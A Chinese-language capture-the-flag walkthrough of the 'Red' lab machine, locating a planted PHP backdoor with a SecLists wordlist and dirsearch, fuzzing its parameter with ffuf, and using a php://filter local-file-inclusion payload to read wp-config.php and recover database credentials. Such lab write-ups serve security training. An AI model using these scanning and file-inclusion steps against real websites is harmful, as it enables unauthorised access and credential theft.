服务信息收集

Web服务信息收集

访问：http://192.168.56.101，进入没有渲染的页面，点击页面的某些连接，转到redrocks.win域名。所以先在/etc/hosts中添加192.168.56.101 redrocks.win的记录。重新访问http://redrocks.win

页面显示：

Hacked By Red

Your site has been Hacked! You’ll never find the backdoor hahahah

说明该网站已经被黑入后门了。

简单的目录扫描：

扫出一些目录，但均无帮助。所以我这里就不列出我的结果了。

在不使用以及猜测弱口令多半行不通的情况下，我不会了，去参考了大佬们的做法，才发现还是自己信息收集做得不到位，在http://redrocks.win/2021/10/24/hello-world/源码中有一行注释：

 Still Looking For It? Maybe you should ask Mr. Miessler for help, not that it matters, you won't be able to read anything with it anyway

我已经告诉你们在哪了，自己去找吧。

搜索引擎搜索：Mr. Miessler，找到 Miessler Github主页，他有一个 Seclists 仓库。里面包含了许多用于安全测试的字典，搜索找到关于PHP后门的字典CommonBackdoors-PHP.fuzz.txt。

apt -y install seclists
# 或者
git clone https://github.com/danielmiessler/SecLists.git

使用dirsearch，使用字典CommonBackdoors-PHP.fuzz.txt

./dirsearch -u http://redrocks.win/ -w your_path/CommonBackdoors-PHP.fuzz.txt

扫描结果：

Target: http://redrocks.win/

[08:49:46] Starting:                                                         
[08:49:50] 500 -    0B  - /NetworkFileManagerPHP.php

Task Completed

该文件的状态码为500，，则可以猜测该文件存在文件包含，所以来Fuzz一下该文件存在的接口参数。

使用 ffuf 工具来Fuzz接口参数，使用Seclists/Discovery/Web-Content/burp-parameter-names.txt字典：

ffuf -c -ac -u http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=123 -w 'your_path/burp-parameter-names.txt'

验证到接口参数 key

使用php://filter/convert.base64-encode/resource=来读取文件内容。

读取 NetworkFileManagerPHP.php 内容，里面有加密内容，base64解密后获得提示：That password alone won’t help you! Hashcat says rules are rules

访问到 wp-config.php 的内容，经base64解密后得到：
define( ‘DB_NAME’, ‘wordpress’ );

/** MySQL database username */

define( 'DB_USER', 'john' );

/** MySQL database password */

define( 'DB_PASSWORD', 'R3v_m4lwh3r3_k1nG!!' );

等。
